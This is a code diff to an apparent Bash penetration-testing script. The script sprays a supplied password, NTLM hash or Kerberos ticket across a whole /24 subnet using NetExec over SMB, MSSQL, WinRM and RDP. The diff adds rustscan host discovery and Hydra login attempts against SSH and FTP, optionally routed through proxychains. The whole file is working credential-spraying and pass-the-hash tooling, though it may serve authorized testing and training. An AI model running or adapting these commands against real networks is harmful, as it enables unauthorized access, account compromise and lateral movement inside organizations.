@@ -8,6 +8,7 @@ hash=""
 domain=""
 KERBEROS=""
 IGNORE_SERVICES=""
+auth_count=0
 
 usage() {
     echo -e "Usage: $0 -i [ip] -u [user] (-p <password> | -H <hash> | -k) -d <domain> [-P]\n"
@@ -37,7 +38,19 @@ is_ignored() {
     return 1
 }
 
-# Parse arguments using getopts
+discover_hosts() {
+    local proto="$1"
+    local port
+    case "${proto}" in
+        ssh) port=22 ;;
+        ftp) port=21 ;;
+        *) echo "[-] discover_hosts: unknown protocol '${proto}'"; return 1 ;;
+    esac
+    echo "[i] Discovering ${proto^^} hosts (port ${port}) in ${iprange}"
+    echo "[*] rustscan -a $iprange -p ${port} --no-banner -g 2>/dev/null" >&2
+    rustscan -a $iprange -p ${port} -g --no-banner 2>/dev/null | awk '{print $1}' > /tmp/rustscan
+}
+
 while getopts i:u:p:H:d:Phkx: flag
 do
     case "${flag}" in
@@ -45,15 +58,15 @@ do
         ;;
         u) user=${OPTARG}
         ;;
-        p) password=${OPTARG}
+        p) password=${OPTARG}; ((auth_count++))
         ;;
-        H) hash=${OPTARG}
+        H) hash=${OPTARG}; ((auth_count++))
         ;;
         d) domain=${OPTARG}
         ;;
         P) PROXYCHAINS="true"
         ;;
-        k) KERBEROS="true"
+        k) KERBEROS="true"; ((auth_count++))
         ;;
         x) IGNORE_SERVICES=${OPTARG}
         ;;
@@ -70,28 +83,23 @@ if [[ -z $ip || -z $user ]]; then
     usage
 fi
 
-auth_count=0
-[[ -n "$password" ]] && ((auth_count++))
-[[ -n "$hash" ]] && ((auth_count++))
-[[ "$KERBEROS" == "true" ]] && ((auth_count++))
-
 if [[ $auth_count -gt 1 ]]; then
     echo "[-] Error: -p, -H, and -k are mutually exclusive"
     usage
 fi
 
-NXC=""
 if [[ "$PROXYCHAINS" == "true" ]]; then
-    nxc=$(which nxc)
-    NXC="sudo proxychains4 ${nxc}"
+    NXC="sudo proxychains4 $(which nxc)"
+    HYDRA="sudo proxychains4 $(which hydra)"
 else
-    NXC=$(which nxc)
+    NXC="nxc"
+    HYDRA="hydra"
 fi
 
-iprange="${ip}/24"
+iprange="$(echo $ip | cut -d'.' -f1-3).0/24"
 
 if [[ -n "$password" ]]; then
-    for proto in smb mssql winrm ftp rdp ssh; do
+    for proto in smb mssql winrm rdp; do
         is_ignored "$proto" && continue
         run_cmd "${NXC} $proto $iprange -u $user -p $password --continue-on-success"
         run_cmd "${NXC} $proto $iprange -u $user -p $password --continue-on-success --local-auth"
@@ -99,16 +107,27 @@ if [[ -n "$password" ]]; then
             run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -p $password --continue-on-success"
         fi
     done
+    for proto in ssh ftp; do
+        is_ignored "$proto" && continue
+        discover_hosts "${proto}"
+        if [[ -f "/tmp/rustscan" ]]; then
+            run_cmd "${HYDRA} -l ${user} -p ${password} -w 2 -t 32 -I -M /tmp/rustscan ${proto}"
+            if [[ -n "$domain" ]]; then
+                run_cmd "${HYDRA} -l ${domain}\\${user} -p ${password} -w 2 -t 32 -I -M /tmp/rustscan ${proto}"
+            fi
+        fi
+        rm /tmp/rustscan
+    done
     exit 0
 fi
 
 if [[ -n "$hash" ]]; then
-    for proto in smb mssql rdp winrm ftp; do
+    for proto in smb mssql rdp winrm; do
         is_ignored "$proto" && continue
         run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
         run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success --local-auth"
         if [[ -n "$domain" ]]; then
-            run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -p $password --continue-on-success"
+            run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
         fi
     done
     exit 0
